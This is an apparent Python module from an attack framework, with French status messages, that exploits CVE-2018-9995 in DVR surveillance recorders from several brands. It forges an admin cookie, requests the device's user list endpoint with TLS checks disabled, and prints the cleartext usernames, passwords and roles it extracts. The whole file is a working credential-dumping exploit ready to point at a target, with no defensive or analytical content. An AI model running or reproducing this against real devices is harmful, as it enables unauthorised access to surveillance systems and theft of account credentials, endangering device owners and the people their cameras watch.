import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "cve_2018_9995/device_rsp_attack"
        self.description = "Exploit module to extract cleartext account credentials via CVE-2018-9995."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        # Affichage informatif des marques concernées dans la console
        print("\033[1;36m[*] Lancement de l'attaque CVE-2018-9995 contre l'équipement (Novo, CeNova, QSee, Pulnix, Securus, Night OWL, XVR...)\033[0m")
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/device.rsp?opt=user&cmd=list"
        else:
            url = f"{target.rstrip('/')}/device.rsp?opt=user&cmd=list"
            
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) dvr-framework/1.0",
            "Cookie": "uid=admin"
        }
        
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print("\033[1;33m[*] Extraction de la base de données utilisateur (CVE-2018-9995)...\033[0m")
                response = await client.get(url, headers=headers)
                
                if response.status_code == 200 and "list" in response.text:
                    data = response.json()
                    users = data.get("list", [])
                    
                    extracted = []
                    for user in users:
                        uid = user.get("uid", "N/A")
                        pwd = user.get("pwd", "N/A")
                        role = user.get("role", "N/A")
                        extracted.append(f"User: {uid} | Pass: {pwd} (RoleID: {role})")
                    
                    return {
                        "success": True,
                        "details": f"Credentials dumped successfully!\n" + "\n".join(f"  -> {item}" for item in extracted)
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit triggered but target returned an unhandled signature."}
